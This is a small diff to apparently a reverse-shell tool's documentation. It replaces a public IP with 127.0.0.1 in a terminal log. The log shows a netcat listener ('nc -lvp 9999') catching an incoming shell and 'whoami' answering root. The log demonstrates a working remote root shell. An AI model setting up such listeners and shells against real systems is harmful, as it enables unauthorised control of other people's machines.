@@ -102,7 +102,7 @@ Another example for an easy copy-paste: reverse shell to 127.0.0.1:9999, target 
 ```` 
 dreg@51.195.45.136:~# nc -lvp 9999
 listening on [any] 9999 ...
-connect to [51.195.45.136] from fr33project.org [51.195.45.136] 33622
+connect to [127.0.0.1] from fr33project.org [127.0.0.1] 33622
 /bin/sh: 0: can't access tty; job control turned off
 # whoami
 root
